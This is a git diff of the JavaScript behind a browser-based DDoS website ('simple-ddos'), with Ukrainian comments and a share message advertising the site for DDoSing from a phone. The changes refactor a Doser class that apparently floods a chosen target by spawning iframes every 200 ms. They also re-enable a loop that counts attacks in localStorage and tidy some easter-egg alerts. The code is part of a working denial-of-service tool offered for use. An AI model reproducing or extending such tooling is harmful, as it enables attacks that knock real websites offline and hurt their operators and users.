@@ -5,7 +5,7 @@ const shareText = `Сайт для **дудосу** з **телефону!**
 > bogdan-dev.ml/simple-ddos
 `
 
-const saverInterval = 2500
+const saverInterval = 3000
 const attackInterval = 200
 
 // Функції для керування документом
@@ -99,7 +99,7 @@ setTarget = (target) => {
 class Doser {
     attack = false; // Статус атаки
     interval; // Цикл DDoS-атаки
-    //saver; // Цикл збереження данних про кількість атак
+    saver; // Цикл збереження данних про кількість атак
 
     async start(isFetch=false) {
     	this.attack = true;
@@ -145,23 +145,16 @@ class Doser {
         	if ($("#frames")[0].childElementCount >= 200) {Frames.clear()};
         }, attackInterval);
 
-        /*
         this.saver = setInterval(() => {
-        	let atck = Database.attacks;
-
-        	atck = !atck ? 0 : parseInt(atck); // Попередні атаки
-        	Database.attacks =
-        	atck + (parseInt(attacks.text()) - atck); // Збереження
-
+        	Database.attacks = parseInt(Database.attacks) + 1
         	console.log("Saved!");
         }, saverInterval);
-        */
     };
     stop() {
     	if (this.interval) {
 	    	this.attack = false;
 	    	clearInterval(this.interval);
-	    	//clearInterval(this.saver);
+	    	clearInterval(this.saver);
 	    	Frames.clear();
 	    	btn.text("Старт!");
     	}
@@ -174,16 +167,16 @@ const btn = $("#button #button-text")
 const Database = window.localStorage
 const box = $("#box")
 
-let neon = false
-Doser = new Doser // Ініціалізація воркера
-
 $(() => {
+	let neon = false;
+	Doser = new Doser; // Ініціалізація воркера
+
 	if (!Database.check_license) {
 		// Ліцензія обов'язкова для прочитання
 
-		alert('Прочитайте ліцензію в розділі "Ресурси"!')
-		Database.check_license = true
-	}
+		alert('Прочитайте ліцензію в розділі "Ресурси"!');
+		Database.check_license = true;
+	};
 
 	$("#button").click((e) => {
 		e.preventDefault();
@@ -202,22 +195,24 @@ $(() => {
 
 	// Пасхалки)
 
-	$("#fixed-bugs").click(() => {alert("Я справді пофіксив баги!")})
+	$("#fixed-bugs").click(() => alert("Я справді пофіксив баги!"));
 
-	$("#uses").click(() => {alert("Цей сайт був написаний 13 річним хакером на JS, HTML, CSS")})
+	$("#uses").click(() => alert("Цей сайт був написаний 13 річним хакером на JS, HTML, CSS"));
 
-	$("#ua").dblclick(() => {alert("Героям Слава!")})
+	$("#ua").dblclick(() => alert("Героям Слава!"));
 
-	const container = $("#container")
-	container.dblclick((e) => {
+	const container = $("#container");
+
+	setShadow = (color) => container.css("box-shadow", `5px 5px 5px ${color}`);
+	container.dblclick(() => {
 		if (!neon) {
-			neon = true
-			container.css("box-shadow", "5px 5px 5px #00ffff")
-			return
-		}
-		neon = false
-		container.css("box-shadow", "5px 5px 5px #444")
-	})
+			neon = true;
+			setShadow("#00ffff");
+			return;
+		};
+		neon = false;
+		setShadow("#444");
+	});
 
 	/*
 	$("#share").click(() => {window.open("tg://?text=${shareText}", "_blank")})
